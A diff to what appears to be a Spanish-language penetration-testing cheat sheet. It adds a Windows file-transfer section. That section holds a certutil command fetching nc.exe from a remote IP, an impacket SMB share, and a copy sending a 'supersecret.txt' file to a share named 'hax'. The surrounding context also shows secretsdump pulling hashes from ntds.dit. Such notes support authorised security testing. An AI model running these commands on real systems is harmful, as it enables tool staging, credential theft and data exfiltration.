@@ -655,15 +655,6 @@ Para sacar los hashes del ntds.dit recuerda que se necesita el registro system.b
 impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
 ```
 
-### smbserver
-
-Para compartir una carpeta desde linux y verla en windows muy util cuando trabajas con windows...
-
-```
-impacket-smbserver smbFolder $(pwd)
-
-```
-
 
 ## WPSCAN
 
@@ -1104,7 +1095,36 @@ Find-AllVulns
 ```
 > https://github.com/rasta-mouse/Sherlock
 
+## Descargar  archivos Windows
 
+```
+certutil.exe -urlcache -split -f "http://172.16.1.30/nc.exe" C:\temp\nc.exe
+```
+
+
+
+### smbserver
+
+Para compartir una carpeta desde linux y verla en windows muy util cuando trabajas con windows...
+
+```
+impacket-smbserver smbFolder $(pwd)
+
+```
+
+Para copiar en windows funciona en ambas direcciones. Esto es la forma mas comoda que he encontrado para poder subir y bajar archivos.
+
+```
+copy \\10.10.1.14\smbfolder\nc.exe
+Para trasferir algo
+copy C:\temp\supersecret.txt \\172.16.1.30\hax\supersecret.txt
+```
+
+> https://juggernaut-sec.com/windows-file-transfers-for-hackers/
+
+> https://ppn.snovvcrash.rocks/pentest/infrastructure/file-transfer
+
+> https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
 
 
 
